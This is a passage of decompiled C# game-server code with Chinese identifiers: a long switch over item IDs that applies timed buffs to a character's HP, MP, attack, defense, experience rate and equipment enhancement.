						追加状态类 追加状态类23 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类23.FLD_PID, 追加状态类23);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.人物追加最大_HP += 500;
						break;
					}
					case 1000000410:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类57 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类57.FLD_PID, 追加状态类57);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.人物追加最大_MP += 500;
						break;
					}
					case 1000000411:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类35 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类35.FLD_PID, 追加状态类35);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						addFLD_追加百分比_防御(0.1);
						break;
					}
					case 1000000412:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类61 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类61.FLD_PID, 追加状态类61);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						addFLD_追加百分比_攻击(0.05);
						break;
					}
					case 1000000413:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类59 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类59.FLD_PID, 追加状态类59);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						addFLD_追加百分比_防御(0.05);
						break;
					}
					case 1000000414:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类44 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类44.FLD_PID, 追加状态类44);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_人物_追加百分比_回避 += 0.05;
						break;
					}
					case 1000000099:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类38 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类38.FLD_PID, 追加状态类38);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1007000014:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类14 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类14.FLD_PID, 追加状态类14);
						base.人物追加最大_HP += 700;
						break;
					}
					case 1007000005:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类10 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类10.FLD_PID, 追加状态类10);
						base.人物追加最大_HP += 300;
						break;
					}
					case 1007000006:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类82 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类82.FLD_PID, 追加状态类82);
						base.人物追加最大_HP += 500;
						break;
					}
					case 1007000007:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类80 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类80.FLD_PID, 追加状态类80);
						base.人物追加最大_HP += 700;
						break;
					}
					case 1008000053:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类69 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类69.FLD_PID, 追加状态类69);
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						break;
					}
					case 1008000016:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类65 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类65.FLD_PID, 追加状态类65);
						addFLD_追加百分比_攻击(0.1);
						break;
					}
					case 1008000017:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类50 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类50.FLD_PID, 追加状态类50);
						addFLD_追加百分比_防御(0.1);
						break;
					}
					case 1008000018:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类47 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类47.FLD_PID, 追加状态类47);
						addFLD_装备_追加_武器_强化(2);
						break;
					}
					case 1008000019:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类36 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类36.FLD_PID, 追加状态类36);
						addFLD_装备_追加_防具_强化(1);
						break;
					}
					case 1008000095:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类33 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类33.FLD_PID, 追加状态类33);
						base.FLD_人物_追加_经验百分比 += 0.2;
						break;
					}
					case 1008002150:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类21 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类21.FLD_PID, 追加状态类21);
						药品追加对怪攻击 += 100;
						药品追加对怪防御 += 100;
						break;
					}
					case 1008000096:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类18 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类18.FLD_PID, 追加状态类18);
						base.FLD_人物_追加_经验百分比 += 0.3;
						break;
					}
					case 1008000097:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类5 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类5.FLD_PID, 追加状态类5);
						base.FLD_人物_追加_经验百分比 += 0.4;
						break;
					}
					case 1008000054:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类13 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类13.FLD_PID, 追加状态类13);
						base.FLD_人物_武功防御力增加百分比 += 0.1;
						break;
					}
					case 1008000183:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类83 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类83.FLD_PID, 追加状态类83);
						base.人物追加最大_HP += 300;
						addFLD_追加百分比_防御(0.05);
						break;
					}
					case 1008000156:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类74 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类74.FLD_PID, 追加状态类74);
						base.人物追加最大_HP += 300;
						break;
					}
					case 1008000159:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类72 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类72.FLD_PID, 追加状态类72);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1008000160:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类64 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类64.FLD_PID, 追加状态类64);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1008000188:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[1008000188].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类62 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类62.FLD_PID, 追加状态类62);
						addFLD_追加百分比_攻击(0.15);
						addFLD_追加百分比_防御(0.15);
						base.人物追加最大_HP += 300;
						base.人物追加最大_MP += 300;
						base.FLD_人物_追加_经验百分比 += 0.1;
						break;
					}
					case 1008000187:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类55 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类55.FLD_PID, 追加状态类55);
						base.人物追加最大_HP += 300;
						base.FLD_人物_追加_气功++;
						break;
					}
					case 1008000195:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类51 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类51.FLD_PID, 追加状态类51);
						base.人物追加最大_HP += 300;
						addFLD_追加百分比_防御(0.05);
						base.FLD_人物_追加_气功++;
						break;
					}
					case 1008000197:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类43 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类43.FLD_PID, 追加状态类43);
						base.人物追加最大_HP += 700;
						addFLD_追加百分比_防御(0.1);
						addFLD_追加百分比_攻击(0.1);
						base.药品减免对方伤害 += 30;
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						base.FLD_人物_武功防御力增加百分比 += 0.1;
						addFLD_装备_追加_防具_强化(1);
						addFLD_装备_追加_武器_强化(2);
						break;
					}
					case 1008000185:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类41 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类41.FLD_PID, 追加状态类41);
						base.人物追加最大_HP += 700;
						base.FLD_人物_追加_经验百分比 += 0.4;
						base.FLD_人物_追加_历练百分比 += 2.0;
						addFLD_追加百分比_防御(0.1);
						addFLD_装备_追加_防具_强化(1);
						addFLD_装备_追加_武器_强化(2);
						break;
					}
					case 1008000194:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类32 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类32.FLD_PID, 追加状态类32);
						base.人物追加最大_HP += 1000;
						addFLD_追加百分比_攻击(0.15);
						addFLD_追加百分比_防御(0.15);
						base.FLD_人物_追加_经验百分比 += 0.4;
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						base.FLD_人物_武功防御力增加百分比 += 0.1;
						break;
					}
					case 1008000304:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类30 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类30.FLD_PID, 追加状态类30);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_追加_防御 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							break;
						}
						return;
					case 1008000305:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类34 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类34.FLD_PID, 追加状态类34);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_追加_防御 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							break;
						}
						return;
					case 1008000306:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类28 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类28.FLD_PID, 追加状态类28);
							base.FLD_人物_追加_经验百分比 += 0.1;
							base.FLD_人物_追加_攻击 += 40;
							base.FLD_人物_追加_防御 += 40;
							base.FLD_人物_武功攻击力增加百分比 += 0.05;
							break;
						}
						return;
					case 1008000307:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类25 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类25.FLD_PID, 追加状态类25);
							base.FLD_人物_追加_经验百分比 += 0.1;
							base.FLD_人物_追加_攻击 += 40;
							base.FLD_人物_追加_防御 += 40;
							base.FLD_人物_武功攻击力增加百分比 += 0.05;
							break;
						}
						return;
					case 1008000232:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类17 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类17.FLD_PID, 追加状态类17);
						base.人物追加最大_HP += 300;
						base.FLD_人物_追加_经验百分比 += 0.1;
						base.FLD_人物_追加_获得游戏币百分比 += 0.4;
						base.FLD_人物_追加_物品掉落概率百分比 += 0.2;
						break;
					}
					case 1008000239:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类15 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类15.FLD_PID, 追加状态类15);
						base.FLD_人物_追加_经验百分比 += 1.0;
						break;
					}
					case 1008000240:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类11 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类11.FLD_PID, 追加状态类11);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							break;
						}
						return;
					case 1008000241:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类8 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类8.FLD_PID, 追加状态类8);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							break;
						}
						return;
					case 1008000242:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类85 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类85.FLD_PID, 追加状态类85);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							break;
						}
						return;
					case 1008000243:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类68 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类68.FLD_PID, 追加状态类68);
						addFLD_追加百分比_攻击(0.2);
						addFLD_追加百分比_防御(0.2);
						base.人物追加最大_HP += 200;
						base.FLD_人物_追加_经验百分比 += 0.15;
						base.FLD_人物_武功攻击力增加百分比 += 0.05;
						break;
					}
					case 1008000245:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类84 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类84.FLD_PID, 追加状态类84);
						base.人物追加最大_HP += 300;
						base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
						base.FLD_人物_武功攻击力增加百分比 += 0.1;
						base.FLD_人物_追加_气功++;
						break;
					}
					case 1008000248:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类81 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类81.FLD_PID, 追加状态类81);
						base.FLD_人物_追加_经验百分比 += 1.0;
						base.FLD_人物_追加_获得游戏币百分比 += 1.0;
						base.FLD_人物_追加_物品掉落概率百分比 += 1.0;
						base.FLD_人物_追加_历练百分比 += 1.0;
						break;
					}
					case 1008000250:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类78 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类78.FLD_PID, 追加状态类78);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							base.FLD_人物_追加_气功++;
							break;
						}
						return;
					case 1008000251:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类76 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类76.FLD_PID, 追加状态类76);
							base.FLD_人物_追加_经验百分比 += 0.05;
							base.FLD_人物_追加_攻击 += 30;
							base.FLD_人物_武功攻击力增加百分比 += 0.03;
							base.FLD_人物_追加_气功++;
							break;
						}
						return;
					case 1008000252:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类73 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类73.FLD_PID, 追加状态类73);
						base.FLD_人物_追加_防御++;
						base.人物追加最大_HP++;
						base.FLD_人物_追加_回避++;
						base.FLD_人物_武功防御力增加百分比 += 0.01;
						base.FLD_人物_武功攻击力增加百分比 += 0.2;
						break;
					}
					case 1008000362:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类70 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类70.FLD_PID, 追加状态类70);
						base.FLD_人物_追加_经验百分比 += 1.5;
						break;
					}
					case 1008000321:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类66 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类66.FLD_PID, 追加状态类66);
						base.FLD_人物_追加_经验百分比 += 0.4;
						break;
					}
					case 1008000322:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类63 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类63.FLD_PID, 追加状态类63);
						base.FLD_人物_追加_经验百分比 += 0.4;
						break;
					}
					case 1008000323:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类60 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类60.FLD_PID, 追加状态类60);
						base.FLD_人物_追加_经验百分比 += 1.0;
						break;
					}
					case 1008000324:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类56 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类56.FLD_PID, 追加状态类56);
						base.FLD_人物_追加_经验百分比 += 1.0;
						break;
					}
					case 1008000325:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类54 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类54.FLD_PID, 追加状态类54);
							base.FLD_人物_追加_经验百分比 += 0.1;
							base.FLD_人物_追加_攻击 += 40;
							base.FLD_人物_追加_防御 += 40;
							base.FLD_人物_武功攻击力增加百分比 += 0.05;
							base.人物追加最大_HP += 300;
							break;
						}
						return;
					case 1008000326:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类52 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类52.FLD_PID, 追加状态类52);
							base.FLD_人物_追加_经验百分比 += 0.1;
							base.FLD_人物_追加_攻击 += 40;
							base.FLD_人物_追加_防御 += 40;
							base.FLD_人物_武功攻击力增加百分比 += 0.05;
							base.人物追加最大_HP += 300;
							break;
						}
						return;
					case 1008000388:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类49 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类49.FLD_PID, 追加状态类49);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_人物_追加_经验百分比 += 3.0;
						break;
					}
					case 1008000363:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类45 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类45.FLD_PID, 追加状态类45);
						base.FLD_人物_追加_经验百分比 += 1.5;
						break;
					}
					case 1008000396:
					{
						if (GetAddState(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类42 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类42.FLD_PID, 追加状态类42);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_人物_追加_攻击 += 30;
						base.FLD_人物_追加_防御 += 30;
						base.人物追加最大_HP += 300;
						base.FLD_人物_追加_历练百分比 += 1.0;
						break;
					}
					case 1008000389:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类39 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类39.FLD_PID, 追加状态类39);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						base.FLD_人物_追加_经验百分比 += 1.5;
						break;
					}
					case 1008001111:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类37 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类37.FLD_PID, 追加状态类37);
							base.人物追加最大_HP += 500;
							base.人物追加最大_MP += 500;
							base.FLD_人物_追加_经验百分比 += 0.04;
							base.FLD_人物_追加_攻击 += 50;
							base.FLD_人物_追加_防御 += 100;
							base.FLD_人物_武功攻击力增加百分比 += 0.1;
							break;
						}
						return;
					case 1008001156:
					case 1008001157:
					case 1008001158:
					case 1008001159:
						if (!GetAddState(1008001156) && !GetAddState(1008001157) && !GetAddState(1008001158) && !GetAddState(1008001159))
						{
							追加状态类 追加状态类29 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类29.FLD_PID, 追加状态类29);
							状态效果(BitConverter.GetBytes(num), 1, num2);
							药品_追加_首饰_强化 += num - 1008001155;
							计算人物装备数据();
							更新武功和状态();
						}
						break;
					case 1008001022:
					case 1008001023:
					case 1008001024:
					case 1008001025:
					case 1008001026:
					case 1008001027:
					case 1008001028:
					case 1008001029:
					case 1008001030:
					case 1008001134:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类26 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类26.FLD_PID, 追加状态类26);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1008000569:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类22 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类22.FLD_PID, 追加状态类22);
						base.FLD_人物_追加_经验百分比 += 2.0;
						break;
					}
					case 1008001187:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类19 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类19.FLD_PID, 追加状态类19);
						base.FLD_人物_追加_经验百分比 += 2.0;
						break;
					}
					case 1008001190:
					case 1008001327:
					case 1008001502:
					case 1008001503:
					case 1008001504:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类16 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类16.FLD_PID, 追加状态类16);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1008001182:
					case 1008001183:
					case 1008001184:
					case 1008001328:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类12 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类12.FLD_PID, 追加状态类12);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1008001513:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类9 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类9.FLD_PID, 追加状态类9);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1008002585:
					case 1008002586:
					case 1008002587:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						追加状态类 追加状态类6 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类6.FLD_PID, 追加状态类6);
						状态效果(BitConverter.GetBytes(num), 1, num2);
						break;
					}
					case 1008001112:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类4 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类4.FLD_PID, 追加状态类4);
							base.人物追加最大_HP += 800;
							base.FLD_人物_追加_回避 += 10;
							base.FLD_人物_追加_武功防御力 += 100.0 / World.武功防御力控制;
							base.FLD_人物_追加_攻击 += 100;
							base.FLD_人物_追加_防御 += 50;
							base.FLD_人物_武功攻击力增加百分比 += 0.1;
							break;
						}
						return;
					case 1008002064:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类79 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类79.FLD_PID, 追加状态类79);
						base.人物追加最大_HP += 1000;
						base.FLD_人物_追加_攻击 += 200;
						base.FLD_人物_追加_防御 += 200;
						base.FLD_人物_追加_经验百分比 += 1.0;
						break;
					}
					case 1008001814:
					{
						if (追加状态列表.ContainsKey(num))
						{
							追加状态列表[num].时间结束事件();
						}
						状态效果(BitConverter.GetBytes(num), 1, num2);
						追加状态类 追加状态类46 = new 追加状态类(this, num2, num, 1);
						追加状态列表.Add(追加状态类46.FLD_PID, 追加状态类46);
						base.FLD_追加百分比_攻击 += 0.28;
						base.FLD_人物_追加_攻击 += 80;
						base.FLD_追加百分比_防御 += 0.3;
						base.FLD_人物_追加_防御 += 80;
						base.人物追加最大_HP += 3000;
						base.FLD_人物_武功攻击力增加百分比 += 0.35;
						base.FLD_人物_武功防御力增加百分比 += 0.23;
						base.FLD_人物_追加_经验百分比 += 2.1;
						base.FLD_人物_追加_吸魂几率百分比 += 10.0;
						break;
					}
					case 1008002386:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类24 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类24.FLD_PID, 追加状态类24);
							base.FLD_人物_追加_攻击 += 100;
							base.FLD_人物_追加_防御 += 100;
							base.人物追加最大_HP += 800;
							base.人物追加最大_MP += 800;
							base.FLD_人物_武功攻击力增加百分比 += 0.1;
							base.FLD_人物_追加_回避 += (int)((double)base.FLD_回避 * 0.05);
							base.FLD_人物_追加_经验百分比 += 0.4;
							break;
						}
						return;
					case 1008002385:
						if (!妖花青草)
						{
							妖花青草 = true;
							状态效果(BitConverter.GetBytes(num), 1, num2);
							追加状态类 追加状态类2 = new 追加状态类(this, num2, num, 1);
							追加状态列表.Add(追加状态类2.FLD_PID, 追加状态类2);
							base.FLD_人物_追加_攻击 += 100;
